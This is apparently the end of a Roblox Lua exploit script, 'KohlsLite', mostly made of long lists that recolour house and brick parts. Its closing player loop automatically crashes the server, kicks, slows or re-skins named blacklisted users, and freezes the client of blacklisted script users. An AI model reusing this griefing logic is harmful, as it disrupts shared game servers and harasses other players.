v.Name == "SmoothBlockModel220" or v.Name == "SmoothBlockModel221" or v.Name == "SmoothBlockModel222" or v.Name == "SmoothBlockModel225" or v.Name == "SmoothBlockModel227" or v.Name == "SmoothBlockModel229" or v.Name == "SmoothBlockModel23" or v.Name == "SmoothBlockModel230" or v.Name == "SmoothBlockModel231" or v.Name == "SmoothBlockModel25" or v.Name == "SmoothBlockModel28" or v.Name == "SmoothBlockModel32" or v.Name == "SmoothBlockModel33" or v.Name == "SmoothBlockModel34" or v.Name == "SmoothBlockModel42" or v.Name == "SmoothBlockModel44" or v.Name == "SmoothBlockModel47" or v.Name == "SmoothBlockModel54" or v.Name == "SmoothBlockModel55" or v.Name == "SmoothBlockModel58" or v.Name == "SmoothBlockModel59" or v.Name == "SmoothBlockModel6" or v.Name == "SmoothBlockModel61" or v.Name == "SmoothBlockModel62" or v.Name == "SmoothBlockModel63" or v.Name == "SmoothBlockModel74" or v.Name == "SmoothBlockModel76" or v.Name == "SmoothBlockModel77" or v.Name == "SmoothBlockModel78" or v.Name == "SmoothBlockModel79" or v.Name == "SmoothBlockModel80" or v.Name == "SmoothBlockModel84" or v.Name == "SmoothBlockModel86" or v.Name == "SmoothBlockModel87" or v.Name == "SmoothBlockModel88" or v.Name == "SmoothBlockModel90" or v.Name == "SmoothBlockModel91" or v.Name == "SmoothBlockModel92" or v.Name == "SmoothBlockModel94" or v.Name == "SmoothBlockModel95" or v.Name == "SmoothBlockModel96" then
						colorAPI.color(v, roofC) -- Default is "Bright red"
					end -- House roof
 
					if v.Name == "SmoothBlockModel10" or v.Name == "SmoothBlockModel101" or v.Name == "SmoothBlockModel117" or v.Name == "SmoothBlockModel121" or v.Name == "SmoothBlockModel144" or v.Name == "SmoothBlockModel145" or v.Name == "SmoothBlockModel146" or v.Name == "SmoothBlockModel148" or v.Name == "SmoothBlockModel150" or v.Name == "SmoothBlockModel159" or v.Name == "SmoothBlockModel161" or v.Name == "SmoothBlockModel171" or v.Name == "SmoothBlockModel174" or v.Name == "SmoothBlockModel175" or v.Name == "SmoothBlockModel181" or v.Name == "SmoothBlockModel182" or v.Name == "SmoothBlockModel183" or v.Name == "SmoothBlockModel192" or v.Name == "SmoothBlockModel194" or v.Name == "SmoothBlockModel195" or v.Name == "SmoothBlockModel199" or v.Name == "SmoothBlockModel204" or v.Name == "SmoothBlockModel206" or v.Name == "SmoothBlockModel212" or v.Name == "SmoothBlockModel217" or v.Name == "SmoothBlockModel228" or v.Name == "SmoothBlockModel24" or v.Name == "SmoothBlockModel27" or v.Name == "SmoothBlockModel35" or v.Name == "SmoothBlockModel4" or v.Name == "SmoothBlockModel43" or v.Name == "SmoothBlockModel45" or v.Name == "SmoothBlockModel46" or v.Name == "SmoothBlockModel50" or v.Name == "SmoothBlockModel53" or v.Name == "SmoothBlockModel57" or v.Name == "SmoothBlockModel60" or v.Name == "SmoothBlockModel64" or v.Name == "SmoothBlockModel65" or v.Name == "SmoothBlockModel66" or v.Name == "SmoothBlockModel7" or v.Name == "SmoothBlockModel71" or v.Name == "SmoothBlockModel73" or v.Name == "SmoothBlockModel82" or v.Name == "SmoothBlockModel83" or v.Name == "SmoothBlockModel89" or v.Name == "SmoothBlockModel99" then
						colorAPI.color(v, WANDDC) -- Default is "Dark orange"
					end -- House windows and door outlines
 
					if v.Name == "SmoothBlockModel1" or v.Name == "SmoothBlockModel3" or v.Name == "SmoothBlockModel5" or v.Name == "SmoothBlockModel9" then
						colorAPI.color(v, stairsC) -- Default is "Dark stone grey"
					end -- House Stairs
 
					if v.Name == "SmoothBlockModel112" then
						colorAPI.color(v, floorC) -- Default is "Medium blue"
					end -- House floor
 
					if v.Name == "SmoothBlockModel52" or v.Name == "SmoothBlockModel97" then
						colorAPI.color(v, rooftsC) -- Default is "Reddish brown"
					end -- House roof thingys
 
					if v.Name == "SmoothBlockModel160" or v.Name == "SmoothBlockModel162" or v.Name == "SmoothBlockModel165" or v.Name == "SmoothBlockModel178" then
						colorAPI.color(v, chiC) -- Default is "Sand red"
					end -- Chi top part
			end)()
		end
end


colorAPI.colorHouse_2 = function(Extra)
		local OutlinesAndWDWS = Extra.WANDDC
		local Walls = Extra.wallsC
		local Roof = Extra.roofC
		local ChimneyTopParts = Extra.chiC
		for i,v in pairs(workspace.Terrain._Game.Workspace["Basic House"]:GetChildren()) do
			coroutine.resume(coroutine.create(function()
				if v.Name == "SmoothBlockModel103" or v.Name == "SmoothBlockModel105" or v.Name == "SmoothBlockModel106" or v.Name == "SmoothBlockModel108" or v.Name == "SmoothBlockModel11" or v.Name == "SmoothBlockModel113" or v.Name == "SmoothBlockModel114" or v.Name == "SmoothBlockModel115" or v.Name == "SmoothBlockModel116" or v.Name == "SmoothBlockModel118" or v.Name == "SmoothBlockModel122" or v.Name == "SmoothBlockModel126" or v.Name == "SmoothBlockModel129" or v.Name == "SmoothBlockModel13" or v.Name == "SmoothBlockModel130" or v.Name == "SmoothBlockModel131" or v.Name == "SmoothBlockModel132" or v.Name == "SmoothBlockModel134" or v.Name == "SmoothBlockModel135" or v.Name == "SmoothBlockModel14" or v.Name == "SmoothBlockModel140" or v.Name == "SmoothBlockModel142" or v.Name == "SmoothBlockModel147" or v.Name == "SmoothBlockModel15" or v.Name == "SmoothBlockModel154" or v.Name == "SmoothBlockModel155" or v.Name == "SmoothBlockModel164" or v.Name == "SmoothBlockModel166" or v.Name == "SmoothBlockModel173" or v.Name == "SmoothBlockModel176" or v.Name == "SmoothBlockModel179" or v.Name == "SmoothBlockModel185" or v.Name == "SmoothBlockModel186" or v.Name == "SmoothBlockModel190" or v.Name == "SmoothBlockModel191" or v.Name == "SmoothBlockModel196" or v.Name == "SmoothBlockModel197" or v.Name == "SmoothBlockModel198" or v.Name == "SmoothBlockModel20" or v.Name == "SmoothBlockModel201" or v.Name == "SmoothBlockModel203" or v.Name == "SmoothBlockModel205" or v.Name == "SmoothBlockModel207" or v.Name == "SmoothBlockModel208" or v.Name == "SmoothBlockModel209" or v.Name == "SmoothBlockModel210" or v.Name == "SmoothBlockModel211" or v.Name == "SmoothBlockModel213" or v.Name == "SmoothBlockModel218" or v.Name == "SmoothBlockModel22" or v.Name == "SmoothBlockModel223" or v.Name == "SmoothBlockModel224" or v.Name == "SmoothBlockModel226" or v.Name == "SmoothBlockModel26" or v.Name == "SmoothBlockModel29" or v.Name == "SmoothBlockModel30" or v.Name == "SmoothBlockModel31" or v.Name == "SmoothBlockModel36" or v.Name == "SmoothBlockModel37" or v.Name == "SmoothBlockModel38" or v.Name == "SmoothBlockModel39" or v.Name == "SmoothBlockModel41" or v.Name == "SmoothBlockModel48" or v.Name == "SmoothBlockModel49" or v.Name == "SmoothBlockModel51" or v.Name == "SmoothBlockModel56" or v.Name == "SmoothBlockModel67" or v.Name == "SmoothBlockModel68" or v.Name == "SmoothBlockModel69" or v.Name == "SmoothBlockModel70" or v.Name == "SmoothBlockModel72" or v.Name == "SmoothBlockModel75" or v.Name == "SmoothBlockModel8" or v.Name == "SmoothBlockModel81" or v.Name == "SmoothBlockModel85" or v.Name == "SmoothBlockModel93" or v.Name == "SmoothBlockModel98" then
					colorAPI.color_2(v,Walls[1], Walls[2], Walls[3])
				end
				if v.Name == "SmoothBlockModel10" or v.Name == "SmoothBlockModel101" or v.Name == "SmoothBlockModel117" or v.Name == "SmoothBlockModel121" or v.Name == "SmoothBlockModel144" or v.Name == "SmoothBlockModel145" or v.Name == "SmoothBlockModel146" or v.Name == "SmoothBlockModel148" or v.Name == "SmoothBlockModel150" or v.Name == "SmoothBlockModel159" or v.Name == "SmoothBlockModel161" or v.Name == "SmoothBlockModel171" or v.Name == "SmoothBlockModel174" or v.Name == "SmoothBlockModel175" or v.Name == "SmoothBlockModel181" or v.Name == "SmoothBlockModel182" or v.Name == "SmoothBlockModel183" or v.Name == "SmoothBlockModel192" or v.Name == "SmoothBlockModel194" or v.Name == "SmoothBlockModel195" or v.Name == "SmoothBlockModel199" or v.Name == "SmoothBlockModel204" or v.Name == "SmoothBlockModel206" or v.Name == "SmoothBlockModel212" or v.Name == "SmoothBlockModel217" or v.Name == "SmoothBlockModel228" or v.Name == "SmoothBlockModel24" or v.Name == "SmoothBlockModel27" or v.Name == "SmoothBlockModel35" or v.Name == "SmoothBlockModel4" or v.Name == "SmoothBlockModel43" or v.Name == "SmoothBlockModel45" or v.Name == "SmoothBlockModel46" or v.Name == "SmoothBlockModel50" or v.Name == "SmoothBlockModel53" or v.Name == "SmoothBlockModel57" or v.Name == "SmoothBlockModel60" or v.Name == "SmoothBlockModel64" or v.Name == "SmoothBlockModel65" or v.Name == "SmoothBlockModel66" or v.Name == "SmoothBlockModel7" or v.Name == "SmoothBlockModel71" or v.Name == "SmoothBlockModel73" or v.Name == "SmoothBlockModel82" or v.Name == "SmoothBlockModel83" or v.Name == "SmoothBlockModel89" or v.Name == "SmoothBlockModel99" then
					colorAPI.color_2(v,OutlinesAndWDWS[1],OutlinesAndWDWS[2],OutlinesAndWDWS[3])
				end
				if v.Name == "SmoothBlockModel100" or v.Name == "SmoothBlockModel102" or v.Name == "SmoothBlockModel104" or v.Name == "SmoothBlockModel107" or v.Name == "SmoothBlockModel109" or v.Name == "SmoothBlockModel110" or v.Name == "SmoothBlockModel111" or v.Name == "SmoothBlockModel119" or v.Name == "SmoothBlockModel12" or v.Name == "SmoothBlockModel120" or v.Name == "SmoothBlockModel123" or v.Name == "SmoothBlockModel124" or v.Name == "SmoothBlockModel125" or v.Name == "SmoothBlockModel127" or v.Name == "SmoothBlockModel128" or v.Name == "SmoothBlockModel133" or v.Name == "SmoothBlockModel136" or v.Name == "SmoothBlockModel137" or v.Name == "SmoothBlockModel138" or v.Name == "SmoothBlockModel139" or v.Name == "SmoothBlockModel141" or v.Name == "SmoothBlockModel143" or v.Name == "SmoothBlockModel149" or v.Name == "SmoothBlockModel151" or v.Name == "SmoothBlockModel152" or v.Name == "SmoothBlockModel153" or v.Name == "SmoothBlockModel156" or v.Name == "SmoothBlockModel157" or v.Name == "SmoothBlockModel158" or v.Name == "SmoothBlockModel16" or v.Name == "SmoothBlockModel163" or v.Name == "SmoothBlockModel167" or v.Name == "SmoothBlockModel168" or v.Name == "SmoothBlockModel169" or v.Name == "SmoothBlockModel17" or v.Name == "SmoothBlockModel170" or v.Name == "SmoothBlockModel172" or v.Name == "SmoothBlockModel177" or v.Name == "SmoothBlockModel18" or v.Name == "SmoothBlockModel180" or v.Name == "SmoothBlockModel184" or v.Name == "SmoothBlockModel187" or v.Name == "SmoothBlockModel188" or v.Name == "SmoothBlockModel189" or v.Name == "SmoothBlockModel19" or v.Name == "SmoothBlockModel193" or v.Name == "SmoothBlockModel2" or v.Name == "SmoothBlockModel200" or v.Name == "SmoothBlockModel202" or v.Name == "SmoothBlockModel21" or v.Name == "SmoothBlockModel214" or v.Name == "SmoothBlockModel215" or v.Name == "SmoothBlockModel216" or v.Name == "SmoothBlockModel219" or v.Name == "SmoothBlockModel220" or v.Name == "SmoothBlockModel221" or v.Name == "SmoothBlockModel222" or v.Name == "SmoothBlockModel225" or v.Name == "SmoothBlockModel227" or v.Name == "SmoothBlockModel229" or v.Name == "SmoothBlockModel23" or v.Name == "SmoothBlockModel230" or v.Name == "SmoothBlockModel231" or v.Name == "SmoothBlockModel25" or v.Name == "SmoothBlockModel28" or v.Name == "SmoothBlockModel32" or v.Name == "SmoothBlockModel33" or v.Name == "SmoothBlockModel34" or v.Name == "SmoothBlockModel42" or v.Name == "SmoothBlockModel44" or v.Name == "SmoothBlockModel47" or v.Name == "SmoothBlockModel54" or v.Name == "SmoothBlockModel55" or v.Name == "SmoothBlockModel58" or v.Name == "SmoothBlockModel59" or v.Name == "SmoothBlockModel6" or v.Name == "SmoothBlockModel61" or v.Name == "SmoothBlockModel62" or v.Name == "SmoothBlockModel63" or v.Name == "SmoothBlockModel74" or v.Name == "SmoothBlockModel76" or v.Name == "SmoothBlockModel77" or v.Name == "SmoothBlockModel78" or v.Name == "SmoothBlockModel79" or v.Name == "SmoothBlockModel80" or v.Name == "SmoothBlockModel84" or v.Name == "SmoothBlockModel86" or v.Name == "SmoothBlockModel87" or v.Name == "SmoothBlockModel88" or v.Name == "SmoothBlockModel90" or v.Name == "SmoothBlockModel91" or v.Name == "SmoothBlockModel92" or v.Name == "SmoothBlockModel94" or v.Name == "SmoothBlockModel95" or v.Name == "SmoothBlockModel96" then
					colorAPI.color_2(v,Roof[1],Roof[2],Roof[3])
				end
				if v.Name == "SmoothBlockModel160" or v.Name == "SmoothBlockModel165" or v.Name == "SmoothBlockModel178" or v.Name == "SmoothBlockModel162" then
					colorAPI.color_2(v,ChimneyTopParts[1],ChimneyTopParts[2],ChimneyTopParts[3])
				end
				if v.Name == "SmoothBlockModel1" or v.Name == "SmoothBlockModel5" or v.Name == "SmoothBlockModel3" or v.Name == "SmoothBlockModel9" then
					colorAPI.color_2(v,Extra.stairsC[1],Extra.stairsC[2],Extra.stairsC[3])
				end
				if v.Name == "SmoothBlockModel97" or v.Name == "SmoothBlockModel52" then
					colorAPI.color_2(v,Extra.rooftsC[1],Extra.rooftsC[2],Extra.rooftsC[3])
				end
			end))
		end
		colorAPI.color_2(workspace.Terrain["_Game"].Workspace["Basic House"].SmoothBlockModel40,Extra.baseC[1],Extra.baseC[2],Extra.baseC[3])
		colorAPI.color_2(workspace.Terrain._Game.Workspace["Basic House"].SmoothBlockModel112,Extra.floorC[1],Extra.floorC[2],Extra.floorC[3])
end

colorAPI.colorBuildingBricks = function(arg)
		local DarkStoneGrey = arg.DarkStoneGrey
		local DeepBlue = arg.DeepBlue
		local NY = arg.NY
		local IW = arg.IW
		local LimeGreen = arg.LimeGreen
		local MSG = arg.MSG
		local RB = arg.RB
		local RR = arg.RR
		local TP = arg.TP
 
		-------------------------------------------------------------------- Building Bricks --------------------------------------------------------------------
 
		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Building Bricks"]:GetChildren()) do
			coroutine.wrap(function()
				if v.Name == "Part29" or v.Name == "Part31" or v.Name == "Part55" then
					colorAPI.color(v, DarkStoneGrey) -- Default is "Dark stone grey"
				end
 
				if v.Name == "Part11" or v.Name == "Part18" or v.Name == "Part25" or v.Name == "Part3" or v.Name == "Part43" then
					colorAPI.color(v, DeepBlue) -- Default is "Deep blue"
				end
 
				if v.Name == "Part12" or v.Name == "Part15" or v.Name == "Part24" or v.Name == "Part44" or v.Name == "Part6" then
					colorAPI.color(v, NY) -- Default is "New Yeller"
				end
 
				if v.Name == "Part13" or v.Name == "Part21" or v.Name == "Part23" or v.Name == "Part7" then
					colorAPI.color(v, IW) -- Default is "Institutional white"
				end
 
				if v.Name == "Part17" or v.Name == "Part26" or v.Name == "Part38" or v.Name == "Part9" or v.Name == "Part5" then
					colorAPI.color(v, LimeGreen) -- Default is "Lime green"
				end
 
				if v.Name == "Part30" or v.Name == "Part32" or v.Name == "Part33" or v.Name == "Part34" or v.Name == "Part35" or v.Name == "Part36" or v.Name == "Part39" or v.Name == "Part40" or v.Name == "Part41" or v.Name == "Part42" or v.Name == "Part46" or v.Name == "Part47" or v.Name == "Part48" or v.Name == "Part49" or v.Name == "Part50" or v.Name == "Part51" or v.Name == "Part52" or v.Name == "Part53" or v.Name == "Part54" or v.Name == "Part56" or v.Name == "Part57" or v.Name == "Part58" or v.Name == "Part59" or v.Name == "Part60" or v.Name == "Part61" then
					colorAPI.color(v, MSG) -- Default is "Medium Stone grey"
				end
 
				if v.Name == "Part14" or v.Name == "Part19" or v.Name == "Part2" or v.Name == "Part27" then
					colorAPI.color(v, RB) -- Default is "Really black"
				end
 
				if v.Name == "Part1" or v.Name == "Part10" or v.Name == "Part16" or v.Name == "Part22" or v.Name == "Part37" then
					colorAPI.color(v, RR) -- Default is "Really red"
				end
 
				if v.Name == "Part20" or v.Name == "Part28" or v.Name == "Part4" or v.Name == "Part45" or v.Name == "Part8" then
					colorAPI.color(v, TP) -- Default is "Toothpaste"
				end
			end)()
		end
end

colorAPI.colorBuildingBricks_2 = function(Extra)
		local DarkStoneGrey = Extra.DarkStoneGrey
		local DeepBlue = Extra.DeepBlue
		local NY = Extra.NY
		local IW = Extra.IW
		local LimeGreen = Extra.LimeGreen
		local MSG = Extra.MSG
		local RB = Extra.RB
		local TP = Extra.TP
		local RR = Extra.RR
		for i,v in pairs(workspace.Terrain._Game.Workspace["Building Bricks"]:GetChildren()) do
			coroutine.resume(coroutine.create(function()
				if v.Name == "Part31" or v.Name == "Part29" or v.Name == "Part55" then
					colorAPI.color_2(v,DarkStoneGrey[1],DarkStoneGrey[2],DarkStoneGrey[3])
				elseif v.Name == "Part43" or v.Name == "Part3" or v.Name == "Part25" or v.Name == "Part18" or v.Name == "Part11" then
					colorAPI.color_2(v,DeepBlue[1],DeepBlue[2],DeepBlue[3])
				elseif v.Name == "Part44" or v.Name == "Part6" or v.Name == "Part24" or v.Name == "Part15" or v.Name == "Part12" then
					colorAPI.color_2(v,NY[1],NY[2],NY[3])
				elseif v.Name == "Part7" or v.Name == "Part13" or v.Name == "Part21" or v.Name == "Part23" then
					colorAPI.color_2(v,IW[1], IW[2], IW[3])
				elseif v.Name == "Part5" or v.Name == "Part9" or v.Name == "Part17" or v.Name == "Part26" or v.Name == "Part38" then
					colorAPI.color_2(v,LimeGreen[1], LimeGreen[2], LimeGreen[3])
				elseif v.Name == "Part2" or v.Name == "Part14" or v.Name == "Part19" or v.Name == "Part27" then
					colorAPI.color_2(v,RB[1], RB[2], RB[3])
				elseif v.Name == "Part1" or v.Name == "Part10" or v.Name == "Part16" or v.Name == "Part22" or v.Name == "Part37" then
					colorAPI.color_2(v,RR[1], RR[2], RR[3])
				elseif v.Name == "Part45" or v.Name == "Part4" or v.Name == "Part8" or v.Name == "Part20" or v.Name == "Part28" then
					colorAPI.color_2(v,TP[1], TP[2], TP[3])
				else
					colorAPI.color_2(v,MSG[1], MSG[2], MSG[3])
				end
			end))
		end
	end

-- Player stuff
for i, v in pairs(game.Players:GetPlayers()) do

        if v.Name == "9jn" or v.Name == "9gn" then
                        antiraygun = true
        end

        if table.find(crash_on_sight, v.Name) then
                Chat("h \n\n\n [KohlsLite]: Server automatically crashed due to blacklisted user ("..v.Name..") being in the server. \n\n\n")
                print(v.Name.." is in the server. Server was automatically crashed as they are blacklisted.")
                DCrash()  
        end

        if table.find(rkick_on_sight, v.Name) then
                Chat("h \n\n\n [KohlsLite]: Auto rocket kicking "..v.Name.." as they are blacklisted. \n\n\n")
                srkick = true
                rkicks = v.Name
                rkicker = v
        end

        if table.find(suser_on_sight, v.Name) then
                Chat("h \n\n\n [KohlsLite]: Auto slowing "..player.Name.." as they are blacklisted. \n\n\n")
                table.insert(carcar, v.Name)
        end

        if table.find(mkick_on_sight, v.Name) then
                Chat("h \n\n\n [KohlsLite]: Auto message kicking "..v.Name.." as they are blacklisted. \n\n\n")
                antichatplr = true
                acplr = v.Name
        end

        if table.find(furry_on_sight, v.Name) then
                Chat(prefix.."char "..v.Name.." furry")
        end

        task.wait(0)
        PLRSTART(v)
end

-- These run last to prevent bugs too
startupScripts()

-- I hope no one gets on here
local unexecuteables = {"aliihsan12345Bloxy","XxSmurfXxSmurfXx","Dj_jake85"}
if table.find(unexecuteables, game.Players.LocalPlayer.Name) then
                pcall(function() -- thanks tech
                        game.Players.LocalPlayer:Kick("[KohlsLite]: Oh dear, you're blacklisted from my script! How did you do that? DM me on ts2021x to appeal.") 
                end)
                task.wait(2.5); while true do end
end

-- Loading (from darc and others) --
local function rankcheck(username)
    if username == "ScriptingProgrammer" then
        return "Owner"
    elseif table.find(specialperms, username) then
	return "Admin"
    else
        return "Member"
    end
end

loadedtime = string.format("%.2f", os.clock() - starttime)

print("- Debug information -")
print("Loaded in " .. loadedtime .. "ms.")
task.wait(2)

username = game.Players.LocalPlayer.Name
rank = rankcheck(username)

print("Status is: " .. rank)

print("if you think i'm a skid go cry i don't care")
